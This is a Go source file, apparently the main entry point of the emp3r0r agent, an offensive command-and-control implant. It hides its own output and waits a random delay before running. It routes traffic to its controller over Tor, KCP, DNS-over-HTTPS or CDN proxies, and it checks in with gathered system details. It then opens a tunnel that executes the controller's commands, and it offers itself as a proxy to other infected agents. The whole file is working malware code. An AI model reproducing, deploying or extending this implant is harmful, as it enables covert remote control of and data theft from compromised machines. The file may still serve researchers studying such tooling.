package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/handler"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
	"github.com/ncruces/go-dns"
)

func agent_main() {
	var err error

	// accept env vars
	null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
	if err != nil {
		logging.Fatalf("%s: %v", os.DevNull, err)
	}
	defer null_file.Close()
	os.Stderr = null_file
	os.Stdout = null_file

	// Check if we're running as a library (CGO build)
	is_dll := IsDLL()

	// applyRuntimeConfig
	logging.Println("Applying runtime config...")
	err = common.InitConfig()
	if err != nil {
		logging.Fatalf("ApplyRuntimeConfig: %v", err)
	}
	util.SetFileCryptoKey([]byte(common.RuntimeConfig.Password))

	if !is_dll {
		// don't be hasty
		time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
	}

	if runtime.GOOS == "linux" {
		// PATH
		agentutils.InitializePath()

		// set HOME to correct value
		setupEnvironment()

		// remove *.downloading files
		cleanUpDownloadingFiles()

		if is_dll {
			logging.Printf("%d is invoked by DLL in %d",
				os.Getpid(), os.Getppid())
		}
	}

	// Construct CC address
	// if CC is behind tor, a proxy is needed
	if netutil.IsTor(def.CCAddress) {
		logging.Printf("CC is on TOR: %s", def.CCAddress)
		logging.Printf("CC is on TOR (%s), using %s as TOR proxy", def.CCAddress, common.RuntimeConfig.C2TransportProxy)
	} else if common.RuntimeConfig.UseKCP {
		// run KCP
		go c2transport.RunKCPClient() // KCP client will run when UseKCP is set
	}
	logging.Printf("CCAddress is: %s", def.CCAddress)

	// DNS
	if common.RuntimeConfig.DoHServer != "" {
		// use DoH resolver
		net.DefaultResolver, err = dns.NewDoHResolver(
			common.RuntimeConfig.DoHServer,
			dns.DoHCache())
		if err != nil {
			logging.Fatal(err)
		}
	}

	// if user wants to use CDN proxy
	upper_proxy := common.RuntimeConfig.C2TransportProxy // when using CDNproxy: agent => CDN proxy => upper_proxy => C2
	if common.RuntimeConfig.CDNProxy != "" {
		logging.Printf("C2 is behind CDN, using CDNProxy %s", common.RuntimeConfig.CDNProxy)
		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
		// DoH server
		dns := "https://9.9.9.9/dns-query"
		if common.RuntimeConfig.DoHServer != "" {
			dns = common.RuntimeConfig.DoHServer
		}
		go func() {
			for !transport.IsProxyOK(cdnproxyAddr, def.CCAddress) {
				// typically you need to configure AgentProxy manually if agent doesn't have internet
				// and AgentProxy will be used for websocket connection, then replaced with 10888
				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], common.RuntimeConfig.CDNProxy, upper_proxy, dns)
				if err != nil {
					logging.Printf("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
				}
			}
		}()
		common.RuntimeConfig.C2TransportProxy = cdnproxyAddr
	}

	// do we have internet?
	checkInternet := func(cnt *int) bool {
		if isC2Reachable() {
			// if we do, we are feeling helpful
			logging.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
			ctx, cancel := context.WithCancel(context.Background())
			go modules.StartBroadcast(true, ctx, cancel) // auto-proxy feature
			return true

		} else if !netutil.IsTor(def.CCAddress) &&
			!transport.IsProxyOK(common.RuntimeConfig.C2TransportProxy, def.CCAddress) {
			// we don't, just wait for some other agents to help us
			logging.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
			if *cnt == 0 {
				go func() {
					ctx, cancel := context.WithCancel(context.Background())
					logging.Printf("[%d] Starting broadcast server to receive proxy", *cnt)
					err := modules.BroadcastServer(ctx, cancel, "")
					if err != nil {
						logging.Fatalf("BroadcastServer: %v", err)
					}
				}()
			}
			*cnt++
			return false
		}
		return true
	}
	i := 0
	for !checkInternet(&i) {
		logging.Printf("[%d] Checking Internet connectivity...", i)
		if common.RuntimeConfig.C2TransportProxy != "" {
			logging.Printf("[+] Thank you! We got a proxy: %s", common.RuntimeConfig.C2TransportProxy)
			break
		}
		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
	}

connect:
	// check preset CC status URL, if CC is supposed to be offline, take a nap
	if common.RuntimeConfig.CCIndicatorWaitMax > 0 &&
		common.RuntimeConfig.CCIndicatorURL != "" { // check indicator URL or not
		if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
			logging.Println("Conditional C2 check failed, signaling parent and exiting")
			conditionalC2FailNotify()
			return
		}
	}

	// apply whatever proxy setting we have just added
	def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
	if def.HTTPClient == nil {
		logging.Printf("[-] Failed to create HTTP2 client, sleeping, will retry later")
		util.TakeASnap()
		goto connect
	}
	if common.RuntimeConfig.C2TransportProxy != "" {
		logging.Printf("Using proxy: %s", common.RuntimeConfig.C2TransportProxy)
	} else {
		logging.Println("Not using proxy")
	}

	logging.Printf("Checking in on %s", def.CCAddress)

	// check in with system info
	err = c2transport.ReportStatus(agentutils.GatherSystemDetails())
	if err != nil {
		logging.Printf("CheckIn error: %v, sleeping, will retry later", err)
		util.TakeASnap()
		goto connect
	}
	logging.Printf("Checked in on CC: %s", def.CCAddress)

	// connect to MsgAPI, the JSON based h2 tunnel
	token := uuid.NewString() // dummy token
	msgURL := netutil.JoinURL(def.CCAddress, transport.MsgAPI, token)
	conn, ctx, cancel, err := c2transport.EstablishC2Connection(msgURL)
	def.CCMsgConn = conn
	if err != nil {
		logging.Printf("Connection failed: %v, signaling parent and exiting", err)
		conditionalC2FailNotify()
		return
	}
	def.KCPKeep = true
	logging.Println("Connecting to message tunnel...")
	c2transport.MsgTunneler(handler.HandleC2Command, ctx, cancel)
	logging.Printf("Message tunnel closed, reconnecting")
	goto connect
}

func setupEnvironment() {
	logging.Println("setupEnvironment...")
	u, err := user.Current()
	if err != nil {
		logging.Printf("Get user info: %v", err)
	} else {
		os.Setenv("HOME", u.HomeDir)
	}
	def.DefaultShell = "/bin/bash"
	if runtime.GOOS == "windows" {
		def.DefaultShell = "elvish"
	} else if !util.IsFileExist(def.DefaultShell) {
		def.DefaultShell = "/bin/bash"
		if !util.IsFileExist(def.DefaultShell) {
			def.DefaultShell = "/bin/sh"
		}
	}
}

func cleanUpDownloadingFiles() {
	logging.Println("cleanUpDownloadingFiles...")
	// No more AgentRoot to clean up
}
